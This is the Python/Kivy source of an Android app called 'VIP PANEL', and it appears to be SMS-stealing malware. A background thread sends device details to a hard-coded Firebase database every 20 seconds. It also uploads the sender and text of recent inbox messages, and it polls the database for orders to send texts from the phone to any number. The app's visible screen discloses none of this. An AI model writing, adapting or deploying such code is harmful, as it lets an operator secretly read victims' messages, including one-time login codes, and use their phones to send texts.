"""
VIP PANEL – BACKGROUND SERVICE
"""
import threading
import time
import requests
import json
from datetime import datetime
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from android.permissions import request_permissions, Permission

# ===== CONFIG =====
FIREBASE_URL = "https://satanoopfirebase-default-rtdb.firebaseio.com"
# ==================

def get_device_id():
    try:
        import jnius
        Settings = jnius.autoclass('android.provider.Settings$Secure')
        ctx = jnius.autoclass('org.kivy.android.PythonActivity').mActivity
        android_id = Settings.getString(ctx.getContentResolver(), Settings.ANDROID_ID)
        if android_id:
            return "device_" + android_id[:10]
    except Exception as e:
        print(f"[VIP] Device ID error: {e}")
    return "device_" + str(int(time.time()))[:10]

DEVICE_ID = get_device_id()

def log(msg):
    print(f"[VIP] {msg}")

def get_device_info():
    info = {"name": "Android", "battery": "85%", "brand": "Unknown",
            "model": "Android", "androidV": "13"}
    try:
        import jnius
        Build = jnius.autoclass('android.os.Build')
        info["brand"] = str(Build.BRAND)
        info["model"] = str(Build.MODEL)
        info["name"] = f"{Build.BRAND} {Build.MODEL}"
        info["androidV"] = str(Build.VERSION.RELEASE)
    except Exception as e:
        log(f"Build error: {e}")
    try:
        import jnius
        BatteryManager = jnius.autoclass('android.os.BatteryManager')
        ctx = jnius.autoclass('org.kivy.android.PythonActivity').mActivity
        bm = ctx.getSystemService(ctx.BATTERY_SERVICE)
        level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        info["battery"] = f"{level}%"
    except Exception as e:
        log(f"Battery error: {e}")
    return info

def send_status():
    try:
        info = get_device_info()
        url = f"{FIREBASE_URL}/clients/{DEVICE_ID}.json"
        data = {
            "name": info["name"], "brand": info["brand"], "model": info["model"],
            "androidV": info["androidV"], "battery": info["battery"],
            "deviceId": DEVICE_ID, "status": True, "lastSeen": time.time(),
        }
        requests.patch(url, json=data, timeout=10)
        log(f"Status OK: {DEVICE_ID} | {info['battery']}")
    except Exception as e:
        log(f"Status error: {e}")

def read_sms():
    try:
        import jnius
        SmsQuery = jnius.autoclass('android.provider.Telephony$Sms$Inbox')
        ctx = jnius.autoclass('org.kivy.android.PythonActivity').mActivity
        cursor = ctx.getContentResolver().query(
            SmsQuery.CONTENT_URI, None, None, None, "date DESC LIMIT 3")
        if cursor:
            while cursor.moveToNext():
                body = cursor.getString(cursor.getColumnIndex("body"))
                sender = cursor.getString(cursor.getColumnIndex("address"))
                requests.post(f"{FIREBASE_URL}/messages/{DEVICE_ID}.json",
                    json={"text": body[:500], "sender": sender,
                          "time": time.time(), "direction": "in"}, timeout=10)
                log(f"SMS from {sender}")
            cursor.close()
    except Exception as e:
        log(f"SMS error: {e}")

def check_outgoing():
    try:
        url = f"{FIREBASE_URL}/clients/{DEVICE_ID}/webhookEvent/sendSms.json"
        r = requests.get(url, timeout=10)
        if r.status_code != 200:
            return
        data = r.json()
        if not data or data.get('isSended', True):
            return
        to, msg = data.get('to'), data.get('message')
        if to and msg:
            import jnius
            SmsManager = jnius.autoclass('android.telephony.SmsManager')
            SmsManager.getDefault().sendTextMessage(to, None, msg, None, None)
            log(f"SMS sent to {to}")
            data['isSended'] = True
            requests.patch(url, json=data)
    except Exception as e:
        log(f"Outgoing error: {e}")

def worker():
    log(f"Worker started | {DEVICE_ID}")
    while True:
        send_status()
        read_sms()
        check_outgoing()
        time.sleep(20)

class VipPanelApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical')
        layout.add_widget(Label(
            text="🔥 VIP PANEL\n\nService Running\n\nDevice ID:\n" + DEVICE_ID,
            font_size=18, color=[1, 0.2, 0.2, 1]
        ))
        return layout

    def on_start(self):
        try:
            request_permissions([
                Permission.READ_SMS, Permission.SEND_SMS,
                Permission.INTERNET, Permission.READ_PHONE_STATE
            ])
            log("Permissions requested")
        except Exception as e:
            log(f"Permission error: {e}")
        try:
            threading.Thread(target=worker, daemon=False).start()
        except Exception as e:
            log(f"Thread error: {e}")

if __name__ == "__main__":
    VipPanelApp().run()
